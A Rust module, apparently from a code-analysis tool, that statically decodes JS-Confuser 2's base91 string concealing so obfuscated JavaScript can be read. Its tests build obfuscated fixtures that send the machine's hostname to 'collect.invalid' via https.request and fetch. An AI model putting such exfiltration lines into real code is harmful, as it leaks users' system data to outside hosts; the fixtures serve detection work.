//! JS-Confuser's string concealing in the decoded view (D-11, 0.1.9). JS-Confuser 2 (since December 2024) replaces
//! each string literal of three characters or more with a call, `F(start, length)`, of a function that slices one
//! long string of the file, decoys around each piece, and decodes the slice with base91 over an alphabet it
//! shuffles for each decoder:
//!
//! ```text
//! function D(str){var table="<the 91 characters, shuffled>";var raw=""+(str||""); … table.indexOf(raw[i]) …
//!   v+=p*91; … return B(ret)}
//! function F(start,length){return D(X["slice"](start,start+length))}
//! var X="<decoys and pieces>";
//! … JSON[F(247,11)]({[F(263,5)]: os[F(270,10)]() …
//! ```
//!
//! Each call is read as its string without running anything: a decoder is a function declaration that holds a
//! literal of the 91 characters (each once) and calls `indexOf`; a retriever returns a decoder's call on the slice
//! of a name (`.slice` or `["slice"]`) from its first parameter to the sum of both; the name's value is the one
//! string literal assigned to it; a call's arguments are numbers, or items of a list of literals assigned once (its
//! "low" preset moves numbers into one: `F(0x9c,C[0x11])`). A call is written as its string where the slice decodes
//! to UTF-8. Renamed names, minified spacing and hexadecimal numbers are read; a retriever or a decoder that a
//! stronger preset's other transforms rewrite (its "medium" and "high" ones put the whole program in a string run
//! by `Function`) is not.

use crate::lex::{self, Kind, Token};
use crate::pystr::PyStr;
use std::collections::HashMap;

/// base91's alphabet, which each decoder shuffles.
const BASE91: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";

/// The code tokens of a text (its comments left out) and their texts.
struct Code<'t> {
    text: &'t [u32],
    toks: Vec<Token>,
}

impl<'t> Code<'t> {
    fn new(text: &'t [u32]) -> Code<'t> {
        let toks = lex::js::tokens(text, false).into_iter().filter(|t| t.kind != Kind::Comment).collect();
        Code { text, toks }
    }

    fn s(&self, i: usize) -> &'t [u32] {
        let t = self.toks[i];
        &self.text[t.start as usize..t.end as usize]
    }

    fn is(&self, i: usize, kind: Kind, s: &str) -> bool {
        i < self.toks.len() && self.toks[i].kind == kind && eq(self.s(i), s)
    }

    fn punct(&self, i: usize, s: &str) -> bool {
        self.is(i, Kind::Punct, s)
    }

    fn name(&self, i: usize) -> Option<&'t [u32]> {
        (i < self.toks.len() && self.toks[i].kind == Kind::Name).then(|| self.s(i))
    }

    /// A string literal's value.
    fn string(&self, i: usize) -> Option<Vec<u32>> {
        (i < self.toks.len() && self.toks[i].kind == Kind::Str).then(|| lex::value::js(self.s(i))).flatten()
    }

    /// A number literal's value (decimal, hexadecimal, octal or binary; a whole number).
    fn number(&self, i: usize) -> Option<f64> {
        if i >= self.toks.len() || self.toks[i].kind != Kind::Num {
            return None;
        }
        let s: String = self.s(i).iter().filter_map(|&c| char::from_u32(c)).filter(|&c| c != '_').collect();
        let lower = s.to_ascii_lowercase();
        let radix = |p: &str, r: u32| lower.strip_prefix(p).and_then(|d| u64::from_str_radix(d, r).ok()).map(|v| v as f64);
        radix("0x", 16).or_else(|| radix("0o", 8)).or_else(|| radix("0b", 2)).or_else(|| lower.parse::<f64>().ok())
    }

    /// The index of the token that closes the bracket at `open`.
    fn close(&self, open: usize) -> Option<usize> {
        let mut depth = 0usize;
        for i in open..self.toks.len() {
            if self.toks[i].kind != Kind::Punct {
                continue;
            }
            match self.s(i) {
                [o] if matches!(char::from_u32(*o), Some('(' | '[' | '{')) => depth += 1,
                [o] if matches!(char::from_u32(*o), Some(')' | ']' | '}')) => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(i);
                    }
                }
                _ => {}
            }
        }
        None
    }
}

fn eq(a: &[u32], b: &str) -> bool {
    a.len() == b.chars().count() && a.iter().zip(b.chars()).all(|(&x, y)| x == y as u32)
}

/// A shuffled base91 alphabet: the 91 characters, each once.
fn alphabet(v: &[u32]) -> bool {
    if v.len() != 91 {
        return false;
    }
    let mut seen = [false; 128];
    for &c in v {
        if c >= 128 || seen[c as usize] || !BASE91.contains(char::from_u32(c).unwrap_or('\0')) {
            return false;
        }
        seen[c as usize] = true;
    }
    true
}

/// The decoders: a function declaration's name and the alphabet it holds.
fn decoders(code: &Code) -> HashMap<PyStr, Vec<u32>> {
    let mut out: HashMap<PyStr, Option<Vec<u32>>> = HashMap::new();
    for i in 0..code.toks.len() {
        if !code.is(i, Kind::Name, "function") {
            continue;
        }
        let (Some(name), true) = (code.name(i + 1), code.punct(i + 2, "(")) else {
            continue;
        };
        let Some(params_end) = code.close(i + 2) else {
            continue;
        };
        if !code.punct(params_end + 1, "{") {
            continue;
        }
        let Some(end) = code.close(params_end + 1) else {
            continue;
        };
        let body = params_end + 2..end;
        let tables: Vec<Vec<u32>> = body.clone().filter_map(|j| code.string(j)).filter(|v| alphabet(v)).collect();
        let index_of = body.clone().any(|j| code.is(j, Kind::Name, "indexOf"));
        if let ([table], true) = (tables.as_slice(), index_of) {
            // (a name declared twice is not read)
            let slot = out.entry(name.to_vec()).or_insert_with(|| Some(table.clone()));
            if slot.as_ref() != Some(table) {
                *slot = None;
            }
        }
    }
    out.into_iter().filter_map(|(k, v)| v.map(|v| (k, v))).collect()
}

/// The retrievers: `function F(a,b){return D(X["slice"](a,a+b))}` (or `X.slice(…)`): F's name, D's, X's.
fn retrievers(code: &Code, decoders: &HashMap<PyStr, Vec<u32>>) -> HashMap<PyStr, (PyStr, PyStr)> {
    let mut out = HashMap::new();
    for i in 0..code.toks.len() {
        if !code.is(i, Kind::Name, "function") {
            continue;
        }
        let (Some(f), Some(a), Some(b)) = (code.name(i + 1), code.name(i + 3), code.name(i + 5)) else {
            continue;
        };
        if !(code.punct(i + 2, "(") && code.punct(i + 4, ",") && code.punct(i + 6, ")") && code.punct(i + 7, "{")) {
            continue;
        }
        let mut j = i + 8;
        if !code.is(j, Kind::Name, "return") {
            continue;
        }
        let (Some(d), Some(x)) = (code.name(j + 1), code.name(j + 3)) else {
            continue;
        };
        if !decoders.contains_key(d) || !code.punct(j + 2, "(") {
            continue;
        }
        j += 4;
        if code.punct(j, ".") && code.is(j + 1, Kind::Name, "slice") {
            j += 2;
        } else if code.punct(j, "[") && code.string(j + 1).is_some_and(|v| eq(&v, "slice")) && code.punct(j + 2, "]") {
            j += 3;
        } else {
            continue;
        }
        // (`(a, a + b)`, or `b + a`)
        let same = |k: usize, n: &[u32]| code.name(k) == Some(n);
        let sum = (same(j + 3, a) && same(j + 5, b)) || (same(j + 3, b) && same(j + 5, a));
        if !(code.punct(j, "(") && same(j + 1, a) && code.punct(j + 2, ",") && sum && code.punct(j + 4, "+"))
            || !(code.punct(j + 6, ")") && code.punct(j + 7, ")"))
        {
            continue;
        }
        let k = if code.punct(j + 8, ";") { j + 9 } else { j + 8 };
        if code.punct(k, "}") {
            out.insert(f.to_vec(), (d.to_vec(), x.to_vec()));
        }
    }
    out
}

/// What a name is assigned (`X = …`, `var X = …`), each time: the token after the `=`.
fn assignments(code: &Code) -> HashMap<PyStr, Vec<usize>> {
    let mut out: HashMap<PyStr, Vec<usize>> = HashMap::new();
    for i in 1..code.toks.len() {
        if code.punct(i, "=") && !code.punct(i - 1, ".") {
            if let Some(n) = code.name(i - 1) {
                if i < 2 || !code.punct(i - 2, ".") {
                    out.entry(n.to_vec()).or_default().push(i + 1);
                }
            }
        }
    }
    out
}

/// The one string literal a name is assigned (other values it is given in other functions, which JS-Confuser's
/// renaming reuses names for, are not strings).
fn string_of(code: &Code, given: &HashMap<PyStr, Vec<usize>>, name: &[u32]) -> Option<Vec<u32>> {
    let strings: Vec<Vec<u32>> = given.get(name)?.iter().filter_map(|&i| code.string(i)).collect();
    match strings.as_slice() {
        [one] => Some(one.clone()),
        _ => None,
    }
}

/// The lists of literals a name is assigned once (its "low" preset's numbers): their numbers by index.
fn lists(code: &Code, given: &HashMap<PyStr, Vec<usize>>) -> HashMap<PyStr, Vec<Option<f64>>> {
    let mut out = HashMap::new();
    for (name, at) in given {
        let lists: Vec<Vec<Option<f64>>> = at.iter().filter_map(|&i| list_at(code, i)).collect();
        if let [one] = lists.as_slice() {
            out.insert(name.clone(), one.clone());
        }
    }
    out
}

fn list_at(code: &Code, open: usize) -> Option<Vec<Option<f64>>> {
    if !code.punct(open, "[") {
        return None;
    }
    let end = code.close(open)?;
    let mut items = Vec::new();
    let mut i = open + 1;
    while i < end {
        let (value, next) = if code.toks[i].kind == Kind::Str {
            (None, i + 1)
        } else if code.punct(i, "-") && code.number(i + 1).is_some() {
            (code.number(i + 1).map(|n| -n), i + 2)
        } else if code.is(i, Kind::Name, "void") && code.number(i + 1).is_some() {
            (None, i + 2)
        } else {
            (Some(code.number(i)?), i + 1)
        };
        items.push(value);
        if next < end && !code.punct(next, ",") {
            return None;
        }
        i = next + 1;
    }
    Some(items)
}

/// A call's argument: a number, or a list's number by index (`C[0x11]`); and the token after it.
fn argument(code: &Code, lists: &HashMap<PyStr, Vec<Option<f64>>>, i: usize) -> Option<(f64, usize)> {
    if let Some(n) = code.number(i) {
        return Some((n, i + 1));
    }
    let list = lists.get(code.name(i)?)?;
    if !(code.punct(i + 1, "[") && code.punct(i + 3, "]")) {
        return None;
    }
    let k = code.number(i + 2)?;
    if k < 0.0 || k.fract() != 0.0 {
        return None;
    }
    Some(((*list.get(k as usize)?)?, i + 4))
}

/// base91 over `table`, as the decoder reads it (a character not in it is passed over), then UTF-8.
fn decode(table: &[u32], piece: &[u32]) -> Option<Vec<u32>> {
    let mut bytes: Vec<u8> = Vec::new();
    let (mut b, mut n, mut v): (u64, u32, i64) = (0, 0, -1);
    for &ch in piece {
        let Some(p) = table.iter().position(|&t| t == ch) else {
            continue;
        };
        if v < 0 {
            v = p as i64;
        } else {
            v += p as i64 * 91;
            b |= (v as u64) << n;
            n += if v & 8191 > 88 { 13 } else { 14 };
            loop {
                bytes.push((b & 0xff) as u8);
                b >>= 8;
                n -= 8;
                if n <= 7 {
                    break;
                }
            }
            v = -1;
        }
    }
    if v > -1 {
        bytes.push(((b | (v as u64) << n) & 0xff) as u8);
    }
    std::str::from_utf8(&bytes).ok().map(|s| s.chars().map(|c| c as u32).collect())
}

/// The decoded view's reading of JS-Confuser's string concealing in `text`: each call of a retriever written as its
/// string; None when it reads none.
pub fn jc_read(text: &[u32], max_chars: usize) -> Option<PyStr> {
    if text.len() > max_chars || !crate::pystr::contains(text, "slice") || !crate::pystr::contains(text, "indexOf") {
        return None;
    }
    let code = Code::new(text);
    let decoders = decoders(&code);
    if decoders.is_empty() {
        return None;
    }
    let retrievers = retrievers(&code, &decoders);
    if retrievers.is_empty() {
        return None;
    }
    let given = assignments(&code);
    let lists = lists(&code, &given);
    let mut blobs: HashMap<&[u32], Option<Vec<u32>>> = HashMap::new();
    let mut out: PyStr = Vec::with_capacity(text.len());
    let (mut pos, mut read) = (0usize, 0usize);
    for i in 0..code.toks.len() {
        let Some(f) = code.name(i) else {
            continue;
        };
        let Some((d, x)) = retrievers.get(f) else {
            continue;
        };
        if (i > 0 && (code.punct(i - 1, ".") || code.is(i - 1, Kind::Name, "function"))) || !code.punct(i + 1, "(") {
            continue;
        }
        let Some((start, after)) = argument(&code, &lists, i + 2) else {
            continue;
        };
        if !code.punct(after, ",") {
            continue;
        }
        let Some((length, after)) = argument(&code, &lists, after + 1) else {
            continue;
        };
        if !code.punct(after, ")") || start < 0.0 || length < 0.0 || start.fract() != 0.0 || length.fract() != 0.0 {
            continue;
        }
        let blob = blobs.entry(x.as_slice()).or_insert_with(|| string_of(&code, &given, x).filter(|v| v.iter().all(|&c| c < 0x10000)));
        let Some(blob) = blob.as_ref() else {
            continue;
        };
        let (s, e) = (start as usize, (start + length) as usize);
        if e > blob.len() || code.toks[i].start < pos as u32 {
            continue;
        }
        let Some(value) = decode(&decoders[d], &blob[s..e]) else {
            continue;
        };
        out.extend_from_slice(&text[pos..code.toks[i].start as usize]);
        out.extend(crate::strarr::sa_quote(&value));
        pos = code.toks[after].end as usize;
        read += 1;
    }
    if read == 0 {
        return None;
    }
    out.extend_from_slice(&text[pos..]);
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// base91 over `table`, as JS-Confuser's encoder writes it.
    fn encode(table: &[u32], s: &str) -> String {
        let (mut b, mut n, mut out) = (0u64, 0u32, String::new());
        for &byte in s.as_bytes() {
            b |= (byte as u64) << n;
            n += 8;
            if n > 13 {
                let mut v = b & 8191;
                if v > 88 {
                    b >>= 13;
                    n -= 13;
                } else {
                    v = b & 16383;
                    b >>= 14;
                    n -= 14;
                }
                out.push(char::from_u32(table[(v % 91) as usize]).unwrap());
                out.push(char::from_u32(table[(v / 91) as usize]).unwrap());
            }
        }
        if n > 0 {
            out.push(char::from_u32(table[(b % 91) as usize]).unwrap());
            if n > 7 || b > 90 {
                out.push(char::from_u32(table[(b / 91) as usize]).unwrap());
            }
        }
        out
    }

    /// A text as JS-Confuser 2's string concealing writes it, for `strings` used in `body` as `{0}`, `{1}` …: the
    /// decoder (its alphabet `table`), the retriever, the long string (decoys around each piece), the body.
    fn concealed(table: &str, strings: &[&str], body: &str, low: bool) -> String {
        let t: Vec<u32> = table.chars().map(|c| c as u32).collect();
        let mut blob = String::from("q]Zr(t");
        let mut calls = Vec::new();
        for s in strings {
            blob.push_str("%k");
            let start = blob.len();
            let piece = encode(&t, s);
            blob.push_str(&piece);
            calls.push(if low { format!("F(0x{:x},C[{}])", start, calls.len()) } else { format!("F({},{})", start, piece.len()) });
        }
        let lengths: Vec<String> = strings.iter().map(|s| format!("0x{:x}", encode(&t, s).len())).collect();
        let mut body = body.to_string();
        for (k, call) in calls.iter().enumerate() {
            body = body.replace(&format!("{{{}}}", k), call);
        }
        let escaped = table.replace('\\', "\\\\").replace('"', "\\\"");
        let blob = blob.replace('\\', "\\\\").replace('"', "\\\"");
        format!(
            "{}function D(str){{var table=\"{}\";var raw=\"\"+(str||\"\");var len=raw.length;var ret=[];var b=0;var n=0;\
             var v=-1;for(var i=0;i<len;i++){{var p=table.indexOf(raw[i]);if(p===-1)continue;if(v<0){{v=p}}else{{v+=p*91;\
             b|=v<<n;n+=(v&8191)>88?13:14;do{{ret.push(b&255);b>>=8;n-=8}}while(n>7);v=-1}}}}\
             if(v>-1){{ret.push((b|v<<n)&255)}}return B(ret)}}\n\
             function F(start,length){{return D(X{}(start,start+length))}}\nvar X=\"{}\";\n{}",
            if low { format!("const C=[{}];\n", lengths.join(",")) } else { String::new() },
            escaped,
            if low { ".slice" } else { "[\"slice\"]" },
            blob,
            body
        )
    }

    fn read(src: &str) -> Option<String> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        jc_read(&text, 1 << 24).map(|v| v.iter().filter_map(|&c| char::from_u32(c)).collect())
    }

    const TABLE: &str = "p|VjqzHcC[.>#tLO26i{v@X4F<w~u^%J;T]7*+\"=)b8W?`h:kmP1IQNSYRGa/rMxoeA9d$y5gf_(U0KnE,3!Zl}sDB&";

    #[test]
    fn a_concealed_string_is_read_as_its_text() {
        let src = concealed(TABLE, &["stringify", "collect.invalid", "hostname"], "const d=JSON[{0}]({h:os[{2}]()});\
             https.request({hostname:{1}});\n", false);
        let got = read(&src).expect("read");
        assert!(got.ends_with("const d=JSON['stringify']({h:os['hostname']()});https.request({hostname:'collect.invalid'});\n"), "{}", got);
        // the low preset's numbers in a list, hexadecimal
        let low = concealed(TABLE, &["stringify", "collect.invalid"], "JSON[{0}](x);fetch({1});\n", true);
        assert!(read(&low).expect("read").ends_with("JSON['stringify'](x);fetch('collect.invalid');\n"));
        // non-ASCII text, quotes
        let odd = concealed(TABLE, &["héllo 'x' \\ \"y\""], "say({0});\n", false);
        assert!(read(&odd).expect("read").ends_with("say('héllo \\'x\\' \\\\ \"y\"');\n"), "{:?}", read(&odd));
    }

    #[test]
    fn what_is_not_read() {
        let src = concealed(TABLE, &["stringify"], "JSON[{0}](x);\n", false);
        // an alphabet of 90 characters, or one with a character twice; no indexOf
        assert_eq!(read(&src.replacen("&\";", "\";", 1)), None);
        assert_eq!(read(&src.replacen("p|Vj", "p|pj", 1)), None);
        assert_eq!(read(&src.replace("table.indexOf", "table.search")), None);
        // a retriever that slices otherwise; a name given two strings; arguments that are not numbers
        assert_eq!(read(&src.replace("(start,start+length)", "(start,length)")), None);
        assert_eq!(read(&src.replace("(start,start+length)", "(length,start+length)")), None);
        assert!(read(&src.replace("(start,start+length)", "(start,length+start)")).is_some());
        assert_eq!(read(&src.replace("var X=", "X=\"other\";var X=")), None);
        assert_eq!(read(&src.replace("F(", "F(n+").replace("function F(n+", "function F(")), None);
        // a member's call of that name, the declaration itself
        let member = src.replace("JSON[F(", "JSON[o.F(");
        assert!(!read(&member).unwrap_or_default().contains("'stringify'"));
        // past the end of the long string
        assert_eq!(read(&src.replacen("F(8,", "F(800,", 1)), None);
    }
}
